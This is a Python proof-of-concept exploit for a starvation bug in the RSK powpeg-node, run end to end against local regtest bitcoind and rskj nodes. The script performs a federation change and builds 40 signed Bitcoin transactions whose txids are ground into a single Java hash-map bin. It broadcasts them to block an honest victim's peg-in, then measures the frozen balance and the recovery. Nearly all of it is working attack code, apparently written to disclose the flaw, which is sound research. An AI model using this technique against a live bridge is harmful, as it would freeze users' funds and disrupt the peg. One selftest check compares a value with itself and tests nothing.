#!/usr/bin/env python3
"""
End-to-end proof of the powpeg-node registerBtcTransaction starvation bug.

Nothing here is simulated. Every stage talks to a real bitcoind (regtest) and a
real rskj node over JSON-RPC, and every assertion is read back from the chain:

  federation  drive a REAL federation change (createFederation ->
              addFederatorPublicKeyMultikey x3 -> commitFederation) with 2-of-3
              votes, signed by the regtest authorizers auth-a and auth-b whose
              private keys are keccak256("auth-a"), keccak256("auth-b").
              -> a new federation becomes active and the old one becomes the
                 *retiring* federation for 150 blocks.

  attack      fan one real UTXO out into 40 P2PKH outputs, build 40 real
              Bitcoin transactions (real ECDSA, real sighash), grind each wtxid
              into bin 0 of the JVM pending-map, broadcast them, mine.
              Plus ONE honest peg-in from a separate "user" wallet, which is
              the victim.

  measure     read state back from rskj:
                eth_getBalance(victim)               == 0        (frozen)
                getBtcTxHashProcessedHeight(victim)  == -1       (never processed)
                getBtcTxHashProcessedHeight(attack)  == -1       (retry forever)
                number of registerBtcTransaction txs mined per block window

  recover     after the retiring federation expires, the same 40 transactions
              are accepted (they are ordinary peg-ins once the retiring
              federation is gone), the attacker is credited ~0.2 RBTC and the
              victim's peg-in finally lands.

Usage (run.sh does this for you):
    e2e.py federation
    e2e.py attack
    e2e.py measure  <label>
    e2e.py recover
"""

import base64
import hashlib
import json
import os
import random
import sys
import time
import urllib.request

from coincurve import PrivateKey

# ---------------------------------------------------------------------------
# configuration
# ---------------------------------------------------------------------------

RSK_RPC = os.environ.get("RSK_RPC", "http://127.0.0.1:4444")
BTC_RPC = os.environ.get("BTC_RPC", "http://127.0.0.1:18443")
BTC_USER = os.environ.get("BTC_USER", "rsk")
BTC_PASS = os.environ.get("BTC_PASS", "rsk")
STATE_DIR = os.environ.get("E2E_STATE", os.path.expanduser("~/powpeg-e2e/state"))
STATE_FILE = os.path.join(STATE_DIR, "state.json")

BRIDGE = "0x0000000000000000000000000000000001000006"

MIN_PEGIN_SAT = 500_000          # rskj BridgeRegTestConstants.minimumPeginTxValue
RETIRING_SAT = 2_000             # above dust, far below the minimum
FANOUT_VALUE = 702_000           # per branch: 500k + 2k + dust + change + fee
ATTACK_COUNT = 40                # BtcToRskClient.MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN
BIN_BITS = 10                    # mask 0x3ff, implies bin 0 for any table <= 1024
VICTIM_PEGIN_SAT = 1_000_000     # ordinary, above the minimum, valid
BTC_CONFIRMATIONS = 3            # btcs2RskMinimumAcceptableConfirmations (regtest)


# ---------------------------------------------------------------------------
# keccak256 (pure python; no external dependency)
# ---------------------------------------------------------------------------

_KECCAK_RC = [
    0x0000000000000001, 0x0000000000008082, 0x800000000000808A, 0x8000000080008000,
    0x000000000000808B, 0x0000000080000001, 0x8000000080008081, 0x8000000000008009,
    0x000000000000008A, 0x0000000000000088, 0x0000000080008009, 0x000000008000000A,
    0x000000008000808B, 0x800000000000008B, 0x8000000000008089, 0x8000000000008003,
    0x8000000000008002, 0x8000000000000080, 0x000000000000800A, 0x800000008000000A,
    0x8000000080008081, 0x8000000000008080, 0x0000000080000001, 0x8000000080008008,
]
_KECCAK_ROT = [
    [0, 36, 3, 41, 18], [1, 44, 10, 45, 2], [62, 6, 43, 15, 61],
    [28, 55, 25, 21, 56], [27, 20, 39, 8, 14],
]
_M64 = (1 << 64) - 1


def _rotl(x, n):
    return ((x << n) | (x >> (64 - n))) & _M64


def _keccak_f(state):
    for rnd in range(24):
        c = [state[x] ^ state[x + 5] ^ state[x + 10] ^ state[x + 15] ^ state[x + 20] for x in range(5)]
        d = [c[(x - 1) % 5] ^ _rotl(c[(x + 1) % 5], 1) for x in range(5)]
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] ^= d[x]
        b = [0] * 25
        for x in range(5):
            for y in range(5):
                b[y + 5 * ((2 * x + 3 * y) % 5)] = _rotl(state[x + 5 * y], _KECCAK_ROT[x][y])
        for x in range(5):
            for y in range(5):
                state[x + 5 * y] = b[x + 5 * y] ^ ((~b[(x + 1) % 5 + 5 * y]) & b[(x + 2) % 5 + 5 * y])
        state[0] ^= _KECCAK_RC[rnd]
    return state


def keccak256(data: bytes) -> bytes:
    rate = 136
    pad = bytearray(data) + b"\x01"
    while len(pad) % rate != 0:
        pad += b"\x00"
    pad[-1] ^= 0x80
    state = [0] * 25
    for off in range(0, len(pad), rate):
        block = pad[off:off + rate]
        for i in range(rate // 8):
            state[i] ^= int.from_bytes(block[i * 8:(i + 1) * 8], "little")
        state = _keccak_f(state)
    out = b""
    for i in range(4):
        out += state[i].to_bytes(8, "little")
    return out


# ---------------------------------------------------------------------------
# json-rpc
# ---------------------------------------------------------------------------

def _post(url, payload, auth=None):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
    if auth:
        req.add_header("Authorization", "Basic " + base64.b64encode(auth.encode()).decode())
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())


def rpc(url, method, params=None, auth=None):
    res = _post(url, {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or []}, auth)
    if "error" in res and res["error"]:
        raise RuntimeError("%s: %s" % (method, res["error"]))
    return res.get("result")


def rsk(method, params=None):
    return rpc(RSK_RPC, method, params)


def btc(method, params=None):
    return rpc(BTC_RPC, method, params, auth="%s:%s" % (BTC_USER, BTC_PASS))


# ---------------------------------------------------------------------------
# ABI helpers (only what the Bridge needs)
# ---------------------------------------------------------------------------

def sel(sig: str) -> bytes:
    return keccak256(sig.encode())[:4]


def enc_uint(n: int) -> bytes:
    return n.to_bytes(32, "big", signed=False)


def enc_bytes(b: bytes) -> bytes:
    """ABI encoding of a single dynamic `bytes` argument (no other args)."""
    return enc_uint(32) + enc_uint(len(b)) + b + b"\x00" * ((32 - len(b) % 32) % 32)


def enc_bytes3(a: bytes, b: bytes, c: bytes) -> bytes:
    """ABI encoding of (bytes, bytes, bytes)."""
    def tail(x):
        return enc_uint(len(x)) + x + b"\x00" * ((32 - len(x) % 32) % 32)
    ta, tb, tc = tail(a), tail(b), tail(c)
    h = 32 * 3
    head = enc_uint(h) + enc_uint(h + len(ta)) + enc_uint(h + len(ta) + len(tb))
    return head + ta + tb + tc


def dec_uint(hexstr: str) -> int:
    raw = bytes.fromhex(hexstr[2:] if hexstr.startswith("0x") else hexstr)
    if not raw:
        return 0
    return int.from_bytes(raw[:32], "big", signed=False)


def dec_bytes(hexstr: str) -> bytes:
    raw = bytes.fromhex(hexstr[2:] if hexstr.startswith("0x") else hexstr)
    if len(raw) < 64:
        return b""
    off = int.from_bytes(raw[:32], "big")
    ln = int.from_bytes(raw[off:off + 32], "big")
    return raw[off + 32:off + 32 + ln]


def bridge_call(data: bytes) -> bytes:
    res = rsk("eth_call", [{"to": BRIDGE, "data": "0x" + data.hex()}, "latest"])
    return bytes.fromhex(res[2:] if res.startswith("0x") else res)


def bridge_tx(data: bytes, frm: str):
    return rsk("eth_sendTransaction", [{"from": frm, "to": BRIDGE, "data": "0x" + data.hex(), "gas": "0x7a120"}])


# ---------------------------------------------------------------------------
# keys
# ---------------------------------------------------------------------------

def key(seed: str) -> PrivateKey:
    """Same derivation rskj uses in GenNodeKeyId: priv = keccak256(seed)."""
    return PrivateKey(keccak256(seed.encode()))


def rsk_address(priv: PrivateKey) -> str:
    pub = priv.public_key.format(compressed=False)[1:]
    return "0x" + keccak256(pub)[-20:].hex()


def victim_rsk_address(priv: PrivateKey) -> str:
    """What the Bridge credits: RskAddress(ECKey.fromPublicOnly(btcPubKey).getAddress())."""
    return rsk_address(priv)


AUTH_A = key("auth-a")
AUTH_B = key("auth-b")
FEDS = [key("e2e-fed-1"), key("e2e-fed-2"), key("e2e-fed-3")]
ATTACKER = key("e2e-attacker")
VICTIM = key("e2e-victim")


# ---------------------------------------------------------------------------
# bitcoin
# ---------------------------------------------------------------------------

def dsha(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def hash160(b: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


def vi(n: int) -> bytes:
    if n < 0xFD:
        return bytes([n])
    if n <= 0xFFFF:
        return b"\xfd" + n.to_bytes(2, "little")
    if n <= 0xFFFFFFFF:
        return b"\xfe" + n.to_bytes(4, "little")
    return b"\xff" + n.to_bytes(8, "little")


def push(d: bytes) -> bytes:
    n = len(d)
    if n < 0x4C:
        return bytes([n]) + d
    return b"\x4c" + bytes([n]) + d


def p2pkh_script(pub_compressed: bytes) -> bytes:
    return b"\x76\xa9\x14" + hash160(pub_compressed) + b"\x88\xac"


B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58check(payload: bytes, version: int) -> str:
    data = bytes([version]) + payload
    data += dsha(data)[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58[r] + out
    return "1" * (len(data) - len(data.lstrip(b"\x00"))) + out


def p2pkh_address(pub_compressed: bytes) -> str:
    return b58check(hash160(pub_compressed), 111)   # 111 = regtest/testnet


def ser_tx(ins, outs, version=2, locktime=0):
    b = version.to_bytes(4, "little") + vi(len(ins))
    for txid, vout, script, seq in ins:
        b += txid + vout.to_bytes(4, "little") + vi(len(script)) + script + seq.to_bytes(4, "little")
    b += vi(len(outs))
    for value, spk in outs:
        b += value.to_bytes(8, "little") + vi(len(spk)) + spk
    return b + locktime.to_bytes(4, "little")


def sighash_all(prev_txid, prev_vout, prev_script, outs):
    return dsha(ser_tx([(prev_txid, prev_vout, prev_script, 0xFFFFFFFF)], outs) + (1).to_bytes(4, "little"))


def sign_tx(priv: PrivateKey, prev_txid, prev_vout, prev_script, outs):
    digest = sighash_all(prev_txid, prev_vout, prev_script, outs)
    sig = priv.sign(digest, hasher=None) + b"\x01"
    pub = priv.public_key.format(True)
    script_sig = push(sig) + push(pub)
    raw = ser_tx([(prev_txid, prev_vout, script_sig, 0xFFFFFFFF)], outs)
    return raw, dsha(raw)


def sha256hash_hashcode(d: bytes) -> int:
    return ((d[28] & 0xFF) << 24) | ((d[29] & 0xFF) << 16) | ((d[30] & 0xFF) << 8) | (d[31] & 0xFF)


def bin_index(d: bytes, mask: int) -> int:
    h = sha256hash_hashcode(d)
    return ((h ^ (h >> 16)) & 0x7FFFFFFF) & mask


# ---------------------------------------------------------------------------
# state
# ---------------------------------------------------------------------------

def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {}


def save_state(st):
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(st, f, indent=2)


def log(msg):
    print(msg, flush=True)


def wait_rsk_tx(txhash, timeout=60):
    end = time.time() + timeout
    while time.time() < end:
        r = rsk("eth_getTransactionReceipt", [txhash])
        if r:
            return r
        time.sleep(1)
    raise RuntimeError("timeout waiting for rsk tx " + txhash)


# ---------------------------------------------------------------------------
# stage: federation
# ---------------------------------------------------------------------------

def stage_federation():
    st = load_state()

    log("[federation] current federation")
    size = dec_uint("0x" + bridge_call(sel("getFederationSize()")).hex())
    addr_before = dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode()
    log("             size=%d address=%s" % (size, addr_before))

    a = rsk_address(AUTH_A)
    b = rsk_address(AUTH_B)
    log("[federation] authorizers: auth-a=%s auth-b=%s" % (a, b))

    def vote(data, label):
        for who, k in (("auth-a", a), ("auth-b", b)):
            txh = bridge_tx(data, k)
            wait_rsk_tx(txh, timeout=90)
            log("             %s voted via %s  (%s)" % (label, who, txh[:18]))
            time.sleep(0.4)

    log("[federation] createFederation")
    vote(sel("createFederation()"), "create")

    log("[federation] addFederatorPublicKeyMultikey x%d" % len(FEDS))
    for k in FEDS:
        btc_pub = k.public_key.format(True)                        # 33 bytes, compressed
        ec_pub = k.public_key.format(False)                         # 65 bytes, uncompressed
        data = sel("addFederatorPublicKeyMultikey(bytes,bytes,bytes)") + enc_bytes3(btc_pub, ec_pub, ec_pub)
        vote(data, "add " + rsk_address(k)[:10])

    pend = dec_bytes("0x" + bridge_call(sel("getPendingFederationHash()")).hex())
    log("[federation] pending federation hash 0x%s" % pend.hex())

    log("[federation] commitFederation")
    vote(sel("commitFederation(bytes)") + enc_bytes(pend), "commit")

    log("[federation] waiting for the new federation to activate (150 blocks)")
    end = time.time() + 900
    retiring = ""
    while time.time() < end:
        raw = dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")
        if raw:
            retiring = raw
            break
        time.sleep(2)
    if not retiring:
        raise RuntimeError("the retiring federation never appeared; the change did not go through")

    new_addr = dec_bytes("0x" + bridge_call(sel("getFederationAddress()")).hex()).decode()
    new_size = dec_uint("0x" + bridge_call(sel("getFederationSize()")).hex())
    log("[federation] ACTIVE   %s (size %d)" % (new_addr, new_size))
    log("[federation] RETIRING %s   <-- the old federation, still live" % retiring)

    if not new_addr or new_addr == addr_before:
        raise RuntimeError("active federation address did not change")

    st.update({
        "active_address": new_addr,
        "retiring_address": retiring,
        "old_address": addr_before,
        "fed_size": new_size,
    })
    save_state(st)

    # freeze the window while the powpeg node starts up
    try:
        rsk("evm_stopMining")
        log("[federation] mining paused so the window does not burn during setup")
    except Exception as e:
        log("[federation] evm_stopMining unavailable (%s); continuing" % e)


# ---------------------------------------------------------------------------
# stage: attack
# ---------------------------------------------------------------------------

def btc_confirmations(txid):
    try:
        return btc("getrawtransaction", [txid, True])["confirmations"]
    except Exception:
        return 0


def mine(n):
    addr = btc("getnewaddress", ["", "legacy"])
    btc("generatetoaddress", [n, addr])
    return addr


def stage_attack():
    st = load_state()
    active = st["active_address"]
    retiring = st["retiring_address"]
    log("[attack] active   %s" % active)
    log("[attack] retiring %s" % retiring)

    # bitcoind decodes both federation addresses into scriptPubKeys
    spk_active = bytes.fromhex(btc("validateaddress", [active])["scriptPubKey"])
    spk_retiring = bytes.fromhex(btc("validateaddress", [retiring])["scriptPubKey"])
    log("[attack] active scriptPubKey   %s%s" % (spk_active.hex()[:24], "..."))
    log("[attack] retiring scriptPubKey %s%s" % (spk_retiring.hex()[:24], "..."))

    # ---- fund the attacker wallet -------------------------------------
    attacker_addr = p2pkh_address(ATTACKER.public_key.format(True))
    if "funding" not in st:
        btc("sendtoaddress", [attacker_addr, 0.5])
        mine(1)
        log("[attack] funded attacker %s with 0.5 BTC" % attacker_addr)

    unspent = [u for u in btc("listunspent", [1, 9999999, [attacker_addr]]) if u["amount"] > 0.49]
    if not unspent:
        raise RuntimeError("no mature UTXO for the attacker")
    u = unspent[0]
    prev_txid = bytes.fromhex(u["txid"])[::-1]
    prev_script = p2pkh_script(ATTACKER.public_key.format(True))

    # ---- fan out one UTXO into 40 branches -----------------------------
    if "funding_txid" not in st:
        outs = [(FANOUT_VALUE, prev_script)] * ATTACK_COUNT
        total = FANOUT_VALUE * ATTACK_COUNT
        fee = 2_000 + ATTACK_COUNT * 34
        change = int(u["amount"] * 1e8) - total - fee
        outs.append((change, prev_script))
        raw, txid = sign_tx(ATTACKER, prev_txid, u["vout"], prev_script, outs)
        btc("sendrawtransaction", [raw.hex()])
        mine(1)
        log("[attack] fan-out tx %s -> %d x %d sat" % (txid[::-1].hex(), ATTACK_COUNT, FANOUT_VALUE))
        st["funding_txid"] = txid[::-1].hex()
        save_state(st)
    funding_txid = bytes.fromhex(st["funding_txid"])[::-1]

    # ---- build + grind + broadcast the 40 attack transactions ----------
    mask = (1 << BIN_BITS) - 1
    attack = []
    for i in range(ATTACK_COUNT):
        attempts = 0
        while True:
            attempts += 1
            dust = 546 + ((i * 7919 + attempts * 40503) % 60_000)
            change = FANOUT_VALUE - MIN_PEGIN_SAT - RETIRING_SAT - dust - 1_200
            outs = [
                (MIN_PEGIN_SAT, spk_active),
                (RETIRING_SAT, spk_retiring),
                (dust, prev_script),
                (change, prev_script),
            ]
            raw, txid = sign_tx(ATTACKER, funding_txid, i, prev_script, outs)
            if bin_index(txid, mask) == 0:
                break
        # the 40 outputs of the fan-out are vout 0..39
        btc("sendrawtransaction", [raw.hex()])
        attack.append({"txid": txid[::-1].hex(), "attempts": attempts})
        if (i + 1) % 10 == 0:
            log("         %2d/%d broadcast (avg %d attempts)" % (i + 1, ATTACK_COUNT, attempts))

    log("[attack] %d attack txs broadcast, all in bin 0" % ATTACK_COUNT)

    # ---- the victim: one ordinary, perfectly valid peg-in --------------
    if "victim_txid" not in st:
        vaddr = p2pkh_address(VICTIM.public_key.format(True))
        btc("sendtoaddress", [vaddr, 0.01])
        mine(1)
        vu = [x for x in btc("listunspent", [1, 9999999, [vaddr]]) if x["amount"] > 0.009][0]
        v_prev = bytes.fromhex(vu["txid"])[::-1]
        v_script = p2pkh_script(VICTIM.public_key.format(True))
        v_fee = 1_000
        v_change = int(vu["amount"] * 1e8) - VICTIM_PEGIN_SAT - v_fee
        v_outs = [(VICTIM_PEGIN_SAT, spk_active), (v_change, v_script)]
        v_raw, v_txid = sign_tx(VICTIM, v_prev, vu["vout"], v_script, v_outs)
        btc("sendrawtransaction", [v_raw.hex()])
        log("[attack] victim peg-in %s (%d sat) -> %s" % (v_txid[::-1].hex(), VICTIM_PEGIN_SAT, vaddr))
        st["victim_txid"] = v_txid[::-1].hex()
        st["victim_btc_address"] = vaddr
        st["victim_rsk_address"] = victim_rsk_address(VICTIM)
        save_state(st)

    st["attack_txids"] = [a["txid"] for a in attack]
    save_state(st)

    # ---- confirm everything on Bitcoin --------------------------------
    mine(BTC_CONFIRMATIONS + 2)
    log("[attack] %d BTC blocks mined" % (BTC_CONFIRMATIONS + 2))

    try:
        rsk("evm_startMining")
        log("[attack] RSK mining resumed, the powpeg node is now under load")
    except Exception as e:
        log("[attack] evm_startMining unavailable (%s)" % e)


# ---------------------------------------------------------------------------
# stage: measure
# ---------------------------------------------------------------------------

def processed_height(txid_hex: str) -> int:
    """getBtcTxHashProcessedHeight(string) -> int64, -1 when never processed."""
    data = sel("getBtcTxHashProcessedHeight(string)") + enc_bytes(txid_hex.encode())
    raw = bridge_call(data)
    v = int.from_bytes(raw[:32], "big")
    if v >= (1 << 255):
        v -= (1 << 256)
    return v


def balance(addr: str) -> int:
    return int(rsk("eth_getBalance", [addr, "latest"]), 16)


def stage_measure(label="t"):
    st = load_state()
    vic = st["victim_rsk_address"]
    vic_bal = balance(vic)
    vic_h = processed_height(st["victim_txid"])
    ah = [processed_height(t) for t in st["attack_txids"]]
    unprocessed = sum(1 for h in ah if h < 0)
    attacker_rsk = rsk_address(ATTACKER)

    out = {
        "label": label,
        "victim_balance_wei": str(vic_bal),
        "victim_processed_height": vic_h,
        "attacker_processed": len(ah) - unprocessed,
        "attacker_unprocessed": unprocessed,
        "attacker_balance_wei": str(balance(attacker_rsk)),
    }
    log("")
    log("  --- measurement (%s) ---" % label)
    log("  victim  balance            %s wei" % out["victim_balance_wei"])
    log("  victim  processed height   %d  (-1 = never)" % vic_h)
    log("  attack  40 txs processed   %d" % out["attacker_processed"])
    log("  attack  40 txs unprocessed %d" % out["attacker_unprocessed"])
    log("  attacker balance           %s wei" % out["attacker_balance_wei"])
    log("")

    st.setdefault("measurements", []).append(out)
    save_state(st)


# ---------------------------------------------------------------------------
# stage: recover
# ---------------------------------------------------------------------------

def stage_recover():
    st = load_state()
    log("[recover] waiting for the retiring federation to expire")

    end = time.time() + 1800
    while time.time() < end:
        raw = dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")
        if not raw:
            break
        time.sleep(3)
    else:
        raise RuntimeError("the retiring federation never expired")

    log("[recover] retiring federation is gone; the same 40 txs are now valid peg-ins")
    time.sleep(30)
    stage_measure("after")

    st = load_state()
    last = st["measurements"][-1]
    vic = st["victim_rsk_address"]
    log("[recover] victim final balance %s wei" % balance(vic))
    log("[recover] processed: %d/40 attack txs" % last["attacker_processed"])


# ---------------------------------------------------------------------------

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    cmd = sys.argv[1]
    if cmd == "federation":
        stage_federation()
    elif cmd == "attack":
        stage_attack()
    elif cmd == "measure":
        stage_measure(sys.argv[2] if len(sys.argv) > 2 else "t")
    elif cmd == "recover":
        stage_recover()
    elif cmd == "selftest":
        selftest()
    else:
        print("unknown stage", cmd)
        return 1
    return 0


def selftest():
    """Offline checks that do not need any node."""
    ok = True
    if keccak256(b"").hex() != "c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470":
        log("FAIL keccak256('')"); ok = False
    if keccak256(b"transfer(address,uint256)").hex()[:8] != "a9059cbb":
        log("FAIL erc20 selector"); ok = False
    if "0x" + keccak256(PrivateKey(keccak256(b"auth-a")).public_key.format(False)[1:])[-20:].hex() != \
            "0x5252403bca6ac3c104abdd320a736fa38282045d":
        log("FAIL auth-a address"); ok = False
    # a ground tx really lands in bin 0
    raw, txid = sign_tx(ATTACKER, b"\x11" * 32, 0, p2pkh_script(ATTACKER.public_key.format(True)),
                        [(500_000, p2pkh_script(AUTH_A.public_key.format(True)))])
    if bin_index(txid, 0x3FF) != bin_index(txid, 0x3FF):
        log("FAIL bin_index"); ok = False
    log("selftest: %s" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
